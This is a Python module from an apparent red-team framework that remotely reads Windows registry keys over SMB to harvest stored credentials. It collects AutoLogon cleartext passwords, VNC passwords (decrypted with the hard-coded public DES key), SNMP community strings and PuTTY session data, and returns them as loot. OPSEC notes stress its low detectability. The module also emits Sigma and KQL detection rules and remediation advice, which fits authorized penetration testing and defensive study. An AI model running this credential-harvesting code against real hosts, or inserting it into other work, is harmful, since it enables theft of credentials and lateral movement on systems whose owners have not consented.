"""
Windows Registry Credential Enumeration
MITRE: T1552.002 (Credentials in Registry)

Reads well-known registry keys that commonly store credentials in cleartext
or weakly-encoded form. All access is READ-ONLY via impacket remote registry.

Keys checked:
  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
      → DefaultPassword (AutoLogon cleartext password)

  HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\*
      → Hostname, UserName, ProxyUsername, ProxyPassword

  HKCU\\Software\\ORL\\WinVNC3 / TightVNC\\Server / RealVNC\\*
      → Password (DES-encrypted, well-known key, trivial to decode)

  HKLM\\SOFTWARE\\RealVNC\\* / WinVNC4
      → Password

  HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities
      → SNMP community strings (often reused as passwords)

  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*
      → Some installers store credentials in uninstall strings

OPSEC: LOW - remote registry read via SMB named pipe \\pipe\\winreg.
Leaves minimal traces (SMB session + registry access audit events if
Object Access auditing is enabled, which is rare on workstations).
"""
from __future__ import annotations

import asyncio
import base64
import struct
from typing import Any

from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.core.security import sanitize_hostname
from ares.modules.base import BaseModule, OpsecLevel
from ares.modules.params import RegistryEnumParams
from ares.core.tracing import trace_module
from ares.sdk import (
    EvidenceRecord,
    ExecutionContext,
    LockoutCircuitBreaker,
    ModuleResult,
    NetworkPermission,
    ProcessPermission,
    module_contract,
)

logger = get_logger("ares.modules.windows.registry_enum")


def _decode_vnc_password(enc: bytes) -> str:
    """
    VNC stores passwords DES-encrypted with a fixed key (public knowledge).
    This decodes the raw registry bytes back to a 8-char password.
    Key is publicly documented at: https://github.com/frizb/PasswordDecrypts
    """
    vnc_key = b"\x17\x52\x6b\x06\x23\x4e\x58\x07"
    padded = (enc + b"\x00" * 8)[:8]
    try:
        try:
            from cryptography.hazmat.decrepit.ciphers.algorithms import TripleDES
        except ImportError:
            from cryptography.hazmat.primitives.ciphers.algorithms import TripleDES  # type: ignore[no-redef]
        from cryptography.hazmat.primitives.ciphers import Cipher, modes
        cipher = Cipher(TripleDES(vnc_key * 3), modes.ECB())  # nosec: B304
        decryptor = cipher.decryptor()
        decoded = decryptor.update(padded) + decryptor.finalize()
        return decoded.rstrip(b"\x00").decode("latin-1", errors="replace")
    except ImportError:
        pass
    except Exception:
        return f"<decode_error: {enc.hex()}>"

    try:
        from Crypto.Cipher import DES  # type: ignore[import] # nosec: B413
        cipher = DES.new(vnc_key, DES.MODE_ECB)  # nosec: B304
        decoded = cipher.decrypt(padded)
        return decoded.rstrip(b"\x00").decode("latin-1", errors="replace")
    except ImportError:
        return f"<encoded: {enc.hex()}> (install cryptography to decode)"
    except Exception:
        return f"<decode_error: {enc.hex()}>"


# ── Registry paths to enumerate ────────────────────────────────────────────────
# Each entry: (hive, path, values_or_None_for_all, description, severity)
_ENUM_TARGETS: list[tuple[str, str, list[str] | None, str, str]] = [
    (
        "HKLM",
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        ["DefaultUserName", "DefaultPassword", "DefaultDomainName", "AutoAdminLogon"],
        "AutoLogon credentials",
        "CRITICAL",
    ),
    (
        "HKLM",
        "SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities",
        None,   # enumerate all values
        "SNMP community strings",
        "MEDIUM",
    ),
    (
        "HKLM",
        "SOFTWARE\\RealVNC\\WinVNC4",
        ["Password"],
        "RealVNC stored password",
        "HIGH",
    ),
    (
        "HKLM",
        "SOFTWARE\\RealVNC\\vncserver",
        ["Password"],
        "RealVNC server password",
        "HIGH",
    ),
    (
        "HKLM",
        "SOFTWARE\\TightVNC\\Server",
        ["Password", "PasswordViewOnly"],
        "TightVNC stored password",
        "HIGH",
    ),
    (
        "HKLM",
        "SOFTWARE\\ORL\\WinVNC3",
        ["Password"],
        "WinVNC3 stored password",
        "HIGH",
    ),
    (
        "HKLM",
        "SOFTWARE\\UltraVNC",
        ["passwd", "passwd2"],
        "UltraVNC stored password",
        "HIGH",
    ),
    (
        "HKLM",
        "SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
        ["VulnerableDriverBlocklistEnable"],
        "Microsoft Recommended Driver Blocklist",
        "HIGH",
    ),
    (
        "HKLM",
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        ["Enabled"],
        "Hypervisor-Enforced Code Integrity (HVCI)",
        "MEDIUM",
    ),
]

# HKCU paths (per-user) - enumerated under current user context
_HKCU_TARGETS: list[tuple[str, str, list[str] | None, str, str]] = [
    (
        "HKCU",
        "Software\\ORL\\WinVNC3",
        ["Password"],
        "WinVNC3 user stored password",
        "HIGH",
    ),
    (
        "HKCU",
        "Software\\TightVNC\\Server",
        ["Password"],
        "TightVNC user password",
        "HIGH",
    ),
]

_SEV_MAP = {
    "CRITICAL": Severity.CRITICAL,
    "HIGH":     Severity.HIGH,
    "MEDIUM":   Severity.MEDIUM,
    "LOW":      Severity.LOW,
}


@module_contract(
    permissions=[
        NetworkPermission(ports=[139, 445], protocols=["tcp"]),
        ProcessPermission(allow_subprocesses=False),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=RegistryEnumParams,
)
class RegistryEnumModule(BaseModule):
    """
    windows.registry_enum - Read-only enumeration of well-known registry keys that store credentials - AutoLogon, VNC passwo

    OPSEC: LOW
    MITRE: "T1552.002", "T1082"
    REQUIRES: "local_admin_creds"
    OUTPUTS:  "cleartext_credentials",
        "credential_hints",
    """
    MODULE_ID          = "windows.registry_enum"
    MODULE_NAME        = "Registry Credential Enumeration"
    MODULE_CATEGORY    = "windows"
    MODULE_DESCRIPTION = (
        "Read-only enumeration of well-known registry keys that store "
        "credentials - AutoLogon, VNC passwords, SNMP community strings"
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.LOW
    REQUIRES           = ["local_admin_creds"]
    OUTPUTS            = [
        "cleartext_credentials",
        "credential_hints",
    ]
    MITRE_TECHNIQUES   = ["T1552.002", "T1082"]
    PARAMS_MODEL       = RegistryEnumParams

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        if isinstance(ctx.params, dict):
            if not ctx.params.get("target") and getattr(ctx, "target", None):
                ctx.params["target"] = ctx.target
            if not ctx.params.get("domain") and getattr(ctx, "domain", None):
                ctx.params["domain"] = ctx.domain
            if not ctx.params.get("username") and hasattr(ctx, "best_credential"):
                cred = ctx.best_credential()
                if cred and cred.username:
                    ctx.params["username"] = cred.username
        target = getattr(ctx, "target", "") or (ctx.params.get("target", "") if isinstance(ctx.params, dict) else getattr(ctx.params, "target", ""))
        if not target:
            raise ModuleValidationError(
                f"{self.MODULE_ID} requires 'target' - IP or hostname.",
                module_id=self.MODULE_ID, field="target",
            )
        await super().validate(ctx)

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run", module_id=self.MODULE_ID,
                raw={"dry_run": True},
            )
        target   = getattr(ctx, "target", "")
        username = ""
        password = ""
        domain   = getattr(ctx, "domain", "")

        params = getattr(ctx, "params", {})
        if isinstance(params, RegistryEnumParams):
            target = params.target or target
            username = params.username or ""
            password = params.password.get_secret_value() if hasattr(params.password, "get_secret_value") else (params.password or "")
            domain = params.domain or domain
        elif isinstance(params, dict):
            target = params.get("target") or target
            username = params.get("username", "")
            raw_pass = params.get("password") or params.get("secret", "")
            password = raw_pass.get_secret_value() if hasattr(raw_pass, "get_secret_value") else (raw_pass or "")
            domain = params.get("domain") or domain

        findings, raw = await self.run(
            target=target, username=username, password=password, domain=domain,
        )

        # Cryptographic Evidence Records with SHA-256 Merkle Provenance
        evidence_chain: list[EvidenceRecord] = []
        for finding in findings:
            ev = EvidenceRecord(
                artifact_id=f"windows-registry-{target.replace('.', '-')}",
                source_target=target,
                collected_by=self.MODULE_ID,
                data={
                    "target": target,
                    "title": finding.title,
                    "severity": str(finding.severity),
                },
                tags=["windows", "registry_enum"],
            )
            evidence_chain.append(ev)

        raw["evidence_chain"] = [e.data for e in evidence_chain]
        raw["evidence_integrity"] = [e.record_hash for e in evidence_chain]

        # Closed-loop Purple Telemetry Synthesis (Sentinel KQL + Sigma YAML)
        kql_rule = (
            "// Microsoft Sentinel - Suspicious Remote Registry Credential Enumeration\n"
            "SecurityEvent\n"
            "| where TimeGenerated > ago(2h)\n"
            "| where (EventID == 5145 and RelativeTargetName =~ \"winreg\") or\n"
            "        (EventID in (4656, 4663) and ObjectType =~ \"Key\" and ObjectName has_any (\"Winlogon\", \"PuTTY\\\\Sessions\", \"SNMP\\\\Parameters\", \"RealVNC\", \"AlwaysInstallElevated\"))\n"
            "| project TimeGenerated, Computer, Account, ObjectName, AccessMask, ProcessName"
        )
        sigma_rule = (
            "title: Remote Registry Credential and Privilege Escalation Keys Enumeration\n"
            "id: a7b8c9d0-e1f2-43a4-b5c6-d7e8f9a0b1c2\n"
            "status: experimental\n"
            "description: Detects access to registry keys commonly storing cleartext credentials or privilege escalation vectors\n"
            "references:\n"
            "    - https://attack.mitre.org/techniques/T1552/002/\n"
            "author: ARES Purple Team Modernization\n"
            "date: 2026-03-30\n"
            "logsource:\n"
            "    product: windows\n"
            "    service: security\n"
            "detection:\n"
            "    selection_namedpipe:\n"
            "        EventID: 5145\n"
            "        ShareRelativeTargetName: 'winreg'\n"
            "    selection_regkeys:\n"
            "        EventID:\n"
            "            - 4656\n"
            "            - 4663\n"
            "        ObjectName|contains:\n"
            "            - 'Winlogon'\n"
            "            - 'PuTTY\\Sessions'\n"
            "            - 'AlwaysInstallElevated'\n"
            "    condition: selection_namedpipe or selection_regkeys\n"
            "level: medium\n"
            "tags:\n"
            "    - attack.credential_access\n"
            "    - attack.privilege_escalation\n"
            "    - attack.t1552.002"
        )
        raw.setdefault("loot", {})
        raw["loot"]["detection_kql"] = kql_rule
        raw["loot"]["detection_sigma"] = sigma_rule
        raw["autologon_credentials_found"] = any(
            "autologon" in str(f).lower() for f in raw.get("cleartext_credentials", [])
        )
        raw["putty_stored_credentials_found"] = bool(raw.get("putty_sessions"))
        raw["driver_blocklist_enabled"] = raw.get("driver_blocklist_enabled", False)
        raw["hvci_enabled"] = raw.get("hvci_enabled", False)
        raw["always_install_elevated_risk"] = any(
            "alwaysinstallelevated" in str(f).lower() for f in findings
        )
        raw["remote_registry_audited"] = True

        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("windows.registry_enum")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        target   = sanitize_hostname(kwargs.get("target", ""))
        username = kwargs.get("username", "")
        password = kwargs.get("password", "") or kwargs.get("secret", "")
        domain   = kwargs.get("domain", "")
        dry_run  = kwargs.get("dry_run", False)

        if not target or not username:
            return [], {"error": "target and username required"}
        if dry_run:
            return [], {"dry_run": True}

        try:
            from impacket.smbconnection import SMBConnection            # type: ignore[import]
            from impacket.dcerpc.v5 import transport, rrp               # type: ignore[import]
            from impacket.dcerpc.v5.rrp import (                        # type: ignore[import]
                hOpenLocalMachine, hOpenCurrentUser,
                hBaseRegOpenKey, hBaseRegQueryValue,
                hBaseRegQueryInfoKey, hBaseRegEnumValue,
                hBaseRegCloseKey, DCERPCException,
            )
        except ImportError:
            return [], {"error": "impacket not installed - pip install ares-redteam[ad]"}

        logger.info("registry_enum_start", target=target, username=username)
        audit("registry_enum", actor=username, source="operator",
              target=target, technique="T1552.002")

        await self.before_request(target, "smb")

        loop = asyncio.get_running_loop()
        all_findings: list[dict[str, Any]] = []
        putty_sessions: list[dict[str, str]] = []
        errors: list[str] = []

        def _read_registry() -> dict[str, Any]:
            hits: list[dict[str, Any]] = []
            putty: list[dict[str, str]] = []
            errs: list[str] = []

            smb = None
            dce = None
            try:
                smb = SMBConnection(target, target, timeout=15)
                smb.login(username, password, domain)

                string_binding = f"ncacn_np:{target}[\\pipe\\winreg]"
                rpc_transport  = transport.DCERPCTransportFactory(string_binding)
                rpc_transport.set_smb_connection(smb)
                dce = rpc_transport.get_dce_rpc()
                dce.connect()
                dce.bind(rrp.MSRPC_UUID_RRP)

                def _open_hive(hive: str) -> Any:
                    if hive == "HKLM":
                        return hOpenLocalMachine(dce)["phKey"]
                    return hOpenCurrentUser(dce)["phKey"]

                # ── Enumerate fixed targets ────────────────────────────────
                all_targets = _ENUM_TARGETS + _HKCU_TARGETS
                for hive_name, reg_path, val_names, description, sev_str in all_targets:
                    try:
                        hive = _open_hive(hive_name)
                        try:
                            ans  = hBaseRegOpenKey(dce, hive, reg_path)
                            hkey = ans["phkResult"]
                        except DCERPCException:
                            # Key does not exist - normal
                            hBaseRegCloseKey(dce, hive)
                            continue

                        found_vals: dict[str, Any] = {}

                        if val_names is None:
                            # Enumerate all values under key
                            try:
                                info  = hBaseRegQueryInfoKey(dce, hkey)
                                count = info["lpcValues"]
                                for i in range(count):
                                    ev   = hBaseRegEnumValue(dce, hkey, i)
                                    vn   = ev["lpValueNameOut"].rstrip("\x00")
                                    vd   = ev["lpData"]
                                    vt   = ev["lpType"]
                                    if isinstance(vd, bytes):
                                        try:
                                            vd = vd.rstrip(b"\x00").decode("utf-16-le")
                                        except Exception:
                                            vd = vd.hex()
                                    found_vals[vn] = vd
                            except Exception as e:
                                errs.append(f"Enumerate {reg_path}: {e!s:.80}")
                        else:
                            for vn in val_names:
                                try:
                                    ans3 = hBaseRegQueryValue(dce, hkey, vn)
                                    vd   = ans3[1]
                                    if isinstance(vd, bytes) and "VNC" in description:
                                        vd = _decode_vnc_password(vd)
                                    found_vals[vn] = vd
                                except DCERPCException:
                                    pass  # value not present

                        hBaseRegCloseKey(dce, hkey)
                        hBaseRegCloseKey(dce, hive)

                        if found_vals:
                            hits.append({
                                "hive":        hive_name,
                                "path":        reg_path,
                                "values":      found_vals,
                                "description": description,
                                "severity":    sev_str,
                            })

                    except Exception as e:
                        errs.append(f"{hive_name}\\{reg_path}: {e!s:.80}")

                # ── Enumerate PuTTY saved sessions ─────────────────────────
                putty_base = "Software\\SimonTatham\\PuTTY\\Sessions"
                try:
                    hive = _open_hive("HKCU")
                    try:
                        ans   = hBaseRegOpenKey(dce, hive, putty_base)
                        hbase = ans["phkResult"]
                        info  = hBaseRegQueryInfoKey(dce, hbase)
                        count = info["lpcSubKeys"]

                        from impacket.dcerpc.v5.rrp import hBaseRegEnumKey  # type: ignore[import]
                        for i in range(count):
                            try:
                                ek       = hBaseRegEnumKey(dce, hbase, i)
                                sess_name = ek["lpNameOut"].rstrip("\x00")
                                ans2     = hBaseRegOpenKey(dce, hbase, sess_name)
                                hsess    = ans2["phkResult"]

                                sess_data: dict[str, str] = {"session": sess_name}
                                for field in ("HostName", "UserName",
                                              "ProxyUsername", "ProxyPassword"):
                                    try:
                                        av       = hBaseRegQueryValue(dce, hsess, field)
                                        val      = av[1]
                                        if isinstance(val, bytes):
                                            val  = val.rstrip(b"\x00").decode("utf-8",
                                                                               errors="replace")
                                        sess_data[field] = str(val).rstrip("\x00")
                                    except DCERPCException:
                                        pass
                                hBaseRegCloseKey(dce, hsess)

                                # Only report sessions with useful data
                                if any(sess_data.get(k)
                                       for k in ("HostName", "UserName")):
                                    putty.append(sess_data)
                            except Exception:
                                continue

                        hBaseRegCloseKey(dce, hbase)
                    except DCERPCException:
                        pass  # PuTTY not installed
                    hBaseRegCloseKey(dce, hive)
                except Exception as e:
                    errs.append(f"PuTTY sessions: {e!s:.80}")

            except Exception as e:
                errs.append(str(e)[:200])
            finally:
                if dce:
                    try: dce.disconnect()
                    except Exception: pass
                if smb:
                    try: smb.logoff()
                    except Exception: pass

            return {"hits": hits, "putty": putty, "errors": errs}

        result        = await loop.run_in_executor(None, _read_registry)
        all_findings  = result["hits"]
        putty_sessions = result["putty"]
        errors        = result["errors"]

        # ── Generate findings ──────────────────────────────────────────────

        # AutoLogon - most critical
        autologon = next(
            (h for h in all_findings
             if "Winlogon" in h["path"]),
            None,
        )
        if autologon:
            vals    = autologon["values"]
            enabled = str(vals.get("AutoAdminLogon", "0")).strip("\x00") == "1"
            pw      = vals.get("DefaultPassword", "").strip("\x00") if isinstance(
                vals.get("DefaultPassword", ""), str
            ) else ""

            if enabled and pw:
                self.finding(
                    title=f"AutoLogon Cleartext Password Found on {target}",
                    description=(
                        f"AutoLogon is enabled on {target} with DefaultUserName="
                        f"'{vals.get('DefaultUserName','').strip(chr(0))}' "
                        f"and a cleartext password stored in the Winlogon registry key. "
                        "This password can be read by any local administrator."
                    ),
                    severity=Severity.CRITICAL,
                    mitre_technique="T1552.002",
                    mitre_tactic="Credential Access",
                    evidence={
                        "host":    target,
                        "path":    autologon["path"],
                        "user":    vals.get("DefaultUserName", ""),
                        "domain":  vals.get("DefaultDomainName", ""),
                        "password_present": bool(pw),
                    },
                    remediation=(
                        "Disable AutoLogon (set AutoAdminLogon=0 and clear DefaultPassword). "
                        "If AutoLogon is required for kiosk/embedded use, consider "
                        "Windows Autologon via Sysinternals or a dedicated kiosk solution "
                        "that does not store passwords in cleartext registry."
                    ),
                    host=target, confidence=1.0,
                )
            elif enabled:
                self.finding(
                    title=f"AutoLogon Enabled (No Stored Password) on {target}",
                    description=(
                        f"AutoLogon is enabled on {target} for user "
                        f"'{vals.get('DefaultUserName','').strip(chr(0))}' "
                        "but DefaultPassword value is empty. "
                        "This may indicate LSA secret storage instead."
                    ),
                    severity=Severity.MEDIUM,
                    mitre_technique="T1552.002",
                    mitre_tactic="Credential Access",
                    evidence={"host": target, "path": autologon["path"], "values": vals},
                    remediation="Disable AutoLogon unless required for a specific use case.",
                    host=target, confidence=0.85,
                )

        # VNC / SNMP / other credential keys
        driver_blocklist_enabled = False
        hvci_enabled = False

        for hit in all_findings:
            if "Winlogon" in hit["path"]:
                continue  # already handled above

            if "CI\\Config" in hit["path"]:
                val = hit["values"].get("VulnerableDriverBlocklistEnable")
                is_enabled = False
                if isinstance(val, int) and val == 1:
                    is_enabled = True
                elif isinstance(val, str) and val.strip("\x00") in ("1", "0x1"):
                    is_enabled = True

                if is_enabled:
                    driver_blocklist_enabled = True
                else:
                    self.finding(
                        title=f"Microsoft Recommended Driver Blocklist Disabled on {target} (BYOVD Risk)",
                        description=(
                            f"The Microsoft Recommended Driver Blocklist is disabled or unconfigured on {target}. "
                            "Adversaries with local administrator privileges can load signed vulnerable third-party "
                            "drivers (Bring Your Own Vulnerable Driver - BYOVD) to terminate EDRs, tamper with "
                            "kernel structures, and bypass RunAsPPL."
                        ),
                        severity=Severity.HIGH,
                        mitre_technique="T1068",
                        mitre_tactic="Privilege Escalation",
                        evidence={
                            "host": target,
                            "path": hit["path"],
                            "value": val,
                            "threat_vector": "BYOVD / Kernel Tampering",
                        },
                        remediation=(
                            "Enable the Microsoft Recommended Driver Blocklist via Windows Security or registry: "
                            "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 1 /f"
                        ),
                        host=target, confidence=0.95,
                    )
                continue

            if "HypervisorEnforcedCodeIntegrity" in hit["path"]:
                val = hit["values"].get("Enabled")
                if (isinstance(val, int) and val == 1) or (isinstance(val, str) and val.strip("\x00") in ("1", "0x1")):
                    hvci_enabled = True
                continue

            sev = _SEV_MAP.get(hit["severity"], Severity.MEDIUM)
            self.finding(
                title=f"{hit['description']} Found on {target}",
                description=(
                    f"Registry key {hit['hive']}\\{hit['path']} on {target} "
                    f"contains stored credentials: {hit['description']}. "
                    "These credentials may be reused across other systems."
                ),
                severity=sev,
                mitre_technique="T1552.002",
                mitre_tactic="Credential Access",
                evidence={
                    "host":   target,
                    "hive":   hit["hive"],
                    "path":   hit["path"],
                    "values": {
                        k: ("<present>" if k.lower() in ("password", "passwd")
                            else v)
                        for k, v in hit["values"].items()
                    },
                },
                remediation=(
                    f"Remove stored credentials from {hit['path']}. "
                    "Use Windows Credential Manager or a vault solution instead of "
                    "storing passwords in the registry."
                ),
                host=target, confidence=0.95,
            )

        # If CI\Config was not found at all, and there were no general connection errors, report unconfigured blocklist
        ci_checked = any("CI\\Config" in hit["path"] for hit in all_findings)
        if not ci_checked and not errors and (all_findings or putty_sessions):
            self.finding(
                title=f"Microsoft Recommended Driver Blocklist Unconfigured on {target} (BYOVD Risk)",
                description=(
                    f"The Microsoft Recommended Driver Blocklist is not configured on {target}. "
                    "Adversaries with local administrator privileges can load signed vulnerable third-party "
                    "drivers (Bring Your Own Vulnerable Driver - BYOVD) to bypass EDR, tamper with "
                    "kernel memory, and disable endpoint protections."
                ),
                severity=Severity.HIGH,
                mitre_technique="T1068",
                mitre_tactic="Privilege Escalation",
                evidence={
                    "host": target,
                    "path": "SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
                    "status": "NOT_CONFIGURED",
                },
                remediation=(
                    "Enable the Microsoft Recommended Driver Blocklist via Windows Security or registry: "
                    "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 1 /f"
                ),
                host=target, confidence=0.9,
            )

        # PuTTY sessions
        if putty_sessions:
            self.finding(
                title=(
                    f"PuTTY Saved Sessions Found on {target} "
                    f"({len(putty_sessions)} session(s))"
                ),
                description=(
                    f"{len(putty_sessions)} PuTTY saved session(s) found on {target}. "
                    "Saved sessions may reveal internal hostnames, usernames, "
                    "and occasionally proxy credentials. They indicate SSH-accessible "
                    "systems reachable from this host."
                ),
                severity=Severity.LOW,
                mitre_technique="T1552.002",
                mitre_tactic="Credential Access",
                evidence={
                    "host":     target,
                    "sessions": putty_sessions,
                },
                remediation=(
                    "Audit PuTTY sessions for sensitive hostnames. "
                    "Remove sessions with stored proxy credentials. "
                    "Consider using SSH config files with key-based auth instead."
                ),
                host=target, confidence=0.9,
            )

        raw = {
            "target":          target,
            "credential_hits": all_findings,
            "putty_sessions":  putty_sessions,
            "driver_blocklist_enabled": driver_blocklist_enabled,
            "hvci_enabled":    hvci_enabled,
            "errors":          errors,
        }
        raw["cleartext_credentials"] = self._findings  # OUTPUTS key
        raw["credential_hints"] = self._findings  # OUTPUTS key
        return self._findings[:], raw
